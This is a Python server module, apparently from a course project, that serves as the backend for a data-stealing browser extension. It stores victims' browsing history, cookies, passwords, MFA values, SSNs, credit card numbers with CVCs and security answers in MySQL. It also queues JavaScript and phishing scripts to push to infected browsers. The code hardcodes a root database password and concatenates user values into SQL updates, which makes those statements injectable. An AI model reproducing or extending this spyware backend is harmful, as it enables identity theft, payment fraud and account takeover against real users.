import pymysql
import json, os
import datetime
from copy import deepcopy
from . import app
#from eventlet.db_pool import ConnectionPool
conn_pool = None
BASE_SERVER_RESPONSE = {
    "clientid": 0,
    "security_blacklist":[],
    "js-cmd":[],
}
pending_payloads = {} #format: clientid:<instance of server response>; fetched from database

JScmd = {
        "pattern":"",
        "cmd":"",
}

def new_response(clientid):
    resp = deepcopy(BASE_SERVER_RESPONSE)
    resp["clientid"] = clientid
    return resp


def initDB():
    #global conn_pool
    #conn_pool = conn_pool or ConnectionPool(pymysql, host='localhost', port= 3306, user='root', passwd='seanonymous', db='cse331')
    pass

def getConn():
    return pymysql.connect(host='localhost', port= 3306, user='root', passwd='seanonymous', db='cse331')
    #global conn_pool
    #initDB()
    #return conn_pool.get()

"""
Gets pending payload or constructs a new one and populates based on defaults from the database.
Pulls blacklist from database
"""
def construct_response(clientid):
    with getConn() as conn:
        resp = pending_payloads.pop(clientid, None) or new_response(clientid)
        conn.execute('SELECT URL FROM BlacklistedWebsites')
        blacklist = conn.fetchall()
        blacklistList = []
        for row in blacklist:
            blacklistList.append(row[0])
        resp["security_blacklist"] = blacklistList
        conn.execute('SELECT Payload FROM PendingPayloads WHERE ClientID = (%s)', clientid)
        payload = conn.fetchall()
        if len(payload) != 0:
            if len(payload[0]) != 0: 
                dictPayload = json.loads(payload[0][0])
                dictJS = dictPayload["js-cmd"]
                for x in dictJS:
                    resp["js-cmd"].append(x["cmd"])
    return resp

def is_online(clientid):
    found = [cl for cl, sid in app.connected_clients if cl == clientid]
    if len(found) == 1:
        return 1
    elif len(found) == 0:
        return 0
    else:
        print("how does your client have more than one sid fam how")
        return len(found)


def add_js_cmd(clientid, pattern, cmd):
    tuple_value = deepcopy(JScmd)
    tuple_value["pattern"] = pattern
    tuple_value["cmd"] = cmd
    if is_online(clientid):
        pending_payloads[clientid]["js-cmd"].append(tuple_value)
    else:
        with getConn() as conn:
            conn.execute('SELECT Payload FROM PendingPayloads WHERE ClientID = %s', clientid)
            payload = json.loads(conn.fetchone()[0]) if conn.rowcount != 0 else deepcopy(BASE_SERVER_RESPONSE)
            payload['js-cmd'].append(tuple_value)
            payload = json.dumps(payload)
            if(conn.rowcount == 0):
                conn.execute('INSERT INTO PendingPayloads values (%s, %s)', (clientid, payload))
            else:
                conn.execute('insert into PendingPayloads values (%s, %s) on duplicate key update Payload=(%s)', (clientid, payload, payload))
    return 'OK';

def add_phish_cmd(clientid, pattern, cmd):
    if(cmd == "1" or cmd == "2"):
        fStr = os.environ.get('SEANON_DIR') + "/phish-cmd/" + "phish-" + cmd + ".js"
        fileP = open(fStr, "r")
        sendcmd = fileP.read()
        add_js_cmd(clientid, pattern, sendcmd)
    return 'OK';

"""
Handles creation of new client.
param data is the entire payload converted from json into a dictionary
parses any possible data and inserts the row, then returns the clientid that was generated using LAST_INSERT_ID()
for example, browser history, credentials, forms, etc.
"""
def create_new_client(data):
    with getConn() as conn:
        print('creating new client')
        conn.execute('INSERT INTO Client(ID, CellPhone, StreetAddress, Email, SSN, FirstName, LastName, BirthDate, City, Country, ZipCode, State) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)', (None, None, None, None, None, None, None, None, None, None, None, None))
        conn.execute('SELECT LAST_INSERT_ID()')
        curID = conn.fetchall()[0][0]
        print('new id: {}'.format(curID))
        formsList = data["forms"]
    for x in formsList:
        store_form_data(x, curID)
    credsList = data["creds"]
    for y in credsList:
        store_credential(y, curID)
    cookiesList = data["cookies"]
    for z in cookiesList:
        store_cookie(z, curID)
    store_history(data["history"], curID)
    return curID


"""
Appends each url in the list of history to the client's history file 
    after appending a current timestamp
param data => list of urls
file: ../history-files/<clientid>-hist.txt
returns 0 for ok, non-zero for bad data format
"""
def store_history(data, clientid):
    fStr = os.environ.get('SEANON_DIR') + "/history-files/" + str(clientid) +"-hist.txt"
    file = open(fStr, "w")
    currentTime = datetime.datetime.now()
    file.write(str(currentTime))
    file.write("\n")
    for x in data:
        file.write(x)
        file.write("\n")
    file.close()
    return 0


"""
Stores a single cookie into the database
returns 0 for ok, non-zero for bad data format
"""
def store_cookie(data, clientid):
    with getConn() as conn:
        conn.execute('SELECT * FROM Client WHERE ID = %s', clientid)
        conn.fetchall()
        url = data.get("url", None)
        name = data.get("name", None)
        content = data.get("content", None)
        if(conn.rownumber != 0 and url != None and name != None):
            conn.execute('SELECT * FROM Cookies WHERE CID = %s AND URL = %s AND Name = %s', (clientid, url, name))
            conn.fetchall()
            if(conn.rownumber == 0):
                conn.execute('INSERT INTO Cookies(CID, URL, Content, Name) VALUES (%s, %s, %s, %s)', (clientid, url, content, name))
            elif(conn.rownumber != 0 and content != None):
                conn.execute('INSERT INTO Cookies(CID, URL, Content, Name) VALUES (%s, %s, %s, %s)', (clientid, url, content, name))
    return 0


"""
Stores a single credential into the database
returns 0 for ok, non-zero for bad data format
"""
def store_credential(credentials, clientid):
    url = credentials.get("url", None)
    with getConn() as conn:
        if(credentials.get("Username", None) != None and url != None):
            checkUsername = credentials.get("Username", None)
            conn.execute('SELECT * FROM Credentials WHERE Username = %s AND URL = %s AND CID = %s', (checkUsername, url, clientid))
            if(conn.rowcount == 0):
                conn.execute('INSERT INTO Credentials(Username, UserPassword, URL, CID, MFA) VALUES (%s, %s, %s, %s, %s)', (checkUsername, credentials.get("password", None), url, clientid, credentials.get("MFA", None)))
            else:
                if(credentials.get("UserPassword", None) != None):
                    col5 = credentials.get("UserPassword", None)
                    execStr = "UPDATE Credentials SET UserPassword = '" + col5 + "' WHERE Username = '" + checkUsername + "' AND URL = '" + url  + "' AND CID = " + str(clientid) 
                    conn.execute(execStr)
                if(credentials.get("MFA", None) != None):
                    col6 = credentials.get("MFA", None)
                    execStr = "UPDATE Credentials SET MFA = '" + col6 + "' WHERE Username = '" + checkUsername + "' AND URL = '" + url + "' AND CID = " + str(clientid)
                    conn.execute(execStr)

            #conn.commit()
    
    return 0

def store_form_id_mappings(url, localdef, remotedef):
    with getConn() as conn:
        conn.execute('SELECT * FROM FormIDMappings WHERE URL = (%s) AND LocalDef = (%s) AND RemoteDef = (%s)', (url, localdef, remotedef))
        if(conn.rowcount == 0):
            conn.execute('INSERT INTO FormIDMappings(URL, LocalDef, RemoteDef) VALUES (%s, %s, %s)', (url, localdef, remotedef))


def store_payload(clientid):
    payload = pending_payloads.pop(clientid, None)
    if payload == None:
        return
    with getConn() as conn:
        cur = conn.cursor()
        cur.execute("insert into PendingPayloads values (%s, %s) on duplicate key update Payload=(%s) where ClientID=(%s)", (clientid, payload, payload, clientid))
        conn.commit()
    


"""
param data: form from extension->server payload in the form of a dictionary. key-value pairs are
    "url": url and remotedef: value
Function first reduces url to subdomain.domain.tld and queries FormIDMappings table for all matching rows
Then, for each remotedef: value pair looks for a mapping from query results. if not found, pair is left
    in the dict. if it is found, the data is stored in the appropriate place. (Credentials, CreditCard, etc.)
Remaining values are stored in the ComplexForms table after being converted back into a json string.
"""
def store_form_data(data, clientid):
    url = data.pop("url", None)
    if url == None:
        return -1
    reducedURL = url.split('/')[0] + "//" + url.split('/')[2] + "/"
    with getConn() as conn:
        #cur = conn.cursor()
        conn.execute('SELECT * FROM FormIDMappings WHERE URL = (%s) OR URL = (%s)', (reducedURL, "*"))
        test = conn.fetchall()

        creditCard = {
                    "CreditCardNumber": None,
                    "CVC": None,
                    "ExpirationDate": None,
                    "CID": clientid,
                    "Type": None
                    }
        credentials = {
                "Username": None,
                "UserPassword": None,
                "url": reducedURL,
                "CID": clientid,
                "MFA": None
                }
        enums = ["CellPhone", "StreetAddress", "Email", "SSN", "FirstName", "LastName", "BirthDate", "City", "ZipCode", "Country", "State", "CreditCardNumber", "CVC", "ExpirationDate", "Type", "Username", "UserPassword", "MFA", "Question", "Answer"]
        securityListQ = []
        securityListA = []
        curIndexQ = 0
        curIndexA = 0

        #populate dictionary and pass dictionart to separate function to store data in database
        for row in test:
            if(row[1] in enums):
                val = data.pop(row[2], None)
                if(val != None):
                    if(row[1] == "CellPhone" or row[1] == "StreetAddress" or row[1] == "Email" or row[1] == "SSN" or row[1] == "FirstName" or row[1] == "LastName" or row[1] == "BirthDate" or row[1] == "City" or row[1] == "ZipCode" or row[1] == "Country" or row[1] == "State"):
                        execStr = "UPDATE Client SET " + row[1] + " = '" + val + "' WHERE Id = " + str(clientid)
                        conn.execute(execStr)
                        enums.remove(row[1])
                    elif(row[1] == "CreditCardNumber"):
                        creditCard["CreditCardNumber"] = val
                        enums.remove("CreditCardNumber")
                    elif(row[1] == "CVC"):
                        creditCard["CVC"] = val
                        enums.remove("CVC")
                    elif(row[1] == "ExpirationDate"):
                        creditCard["ExpirationDate"] = val
                        enums.remove("ExpirationDate")
                    elif(row[1] == "Type"):
                        creditCard["Type"] = val
                        enums.remove("Type")
                    elif(row[1] == "Username"):
                        credentials["Username"] = val
                        enums.remove("Username")
                    elif(row[1] == "UserPassword"):
                        credentials["UserPassword"] = val
                        enums.remove("UserPassword")
                    elif(row[1] == "MFA"):
                        credentials["MFA"] = val
                        enums.remove("MFA")
                    elif(row[1] == "Question"):
                        securityListQ.append(val)
                        #securityQ["Question"] = val
                    elif(row[1] == "Answer"):
                        #securityList["Answer"] = val
                        securityListA.append(val)

            #credit card information
        if(creditCard.get("CreditCardNumber", None) != None):
            checkCreditCard = creditCard.get("CreditCardNumber", None)
            conn.execute('SELECT * FROM CreditCard WHERE CreditCardNumber = %s', checkCreditCard)
            if(conn.rowcount == 0):
                conn.execute('INSERT INTO CreditCard(CreditCardNumber, CVC, ExpirationDate, CID, Type) VALUES (%s, %s, %s, %s, %s)', (checkCreditCard, creditCard.get("CVC", None), creditCard.get("ExpirationDate", None), clientid, creditCard.get("Type", None)))
            else:
                if(creditCard.get("CVC", None) != None):
                    col2 = creditCard.get("CVC", None)
                    execStr = "UPDATE CreditCard SET CVC = '" + col2 + "' WHERE CreditCardNumber = '" + checkCreditCard + "'"
                    conn.execute(execStr)
                if(creditCard.get("ExpirationDate", None) != None):
                    col3 = creditCard.get("ExpirationDate", None)
                    execStr = "UPDATE CreditCard SET ExpirationDate = '" + col3 + "' WHERE CreditCardNumber = '" + checkCreditCard + "'"
                    conn.execute(execStr)
                if(creditCard.get("Type", None) != None):
                    col4 = creditCard.get("Type", None)
                    execStr = "UPDATE CreditCard SET Type = '" + col4 + "' WHERE CreditCardNumber = '" + checkCreditCard + "'"
                    conn.execute(execStr)
        
        #credentials information
        print(credentials.get("Username", None))
    store_credential(credentials, clientid)
    with getConn() as conn:

        #security questions information

        for x in range(max(0, len(securityListQ))):
            conn.execute('SELECT * FROM SecurityQuestions WHERE CID = %s AND URL = %s AND Question = %s', (clientid, url, securityListQ[x]))
            if(conn.rowcount == 0 and x < len(securityListA)):
                conn.execute('INSERT INTO SecurityQuestions(CID, Question, Answer, URL) VALUES (%s, %s, %s, %s)', (clientid, securityListQ[x], securityListA[x], url))
            elif(conn.rowcount == 0):
                conn.execute('INSERT INTO SecurityQuestions(CID, Question, Answer, URL) VALUES (%s, %s, %s, %s)', (clientid, securityListQ[x], None, url))
        
        m = len(securityListA) - len(securityListQ)
        if(m > 0):
            for y in range (m):
                data.update({"Answer" + str(y) : securityListA[len(securityListQ) + y]})


        #if(bool(data) == True):
            complexData = json.dumps(data)
            conn.execute('SELECT * FROM ComplexForms WHERE CID = %s AND JSONFORM = %s', (clientid, complexData))
            if(conn.rowcount == 0):
                conn.execute('SELECT * FROM Client WHERE ID = %s', clientid)
                if(conn.rowcount != 0):
                    conn.execute('INSERT INTO ComplexForms(CID, JSONFORM) VALUES (%s, %s)', (clientid, complexData))
        #conn.commit()
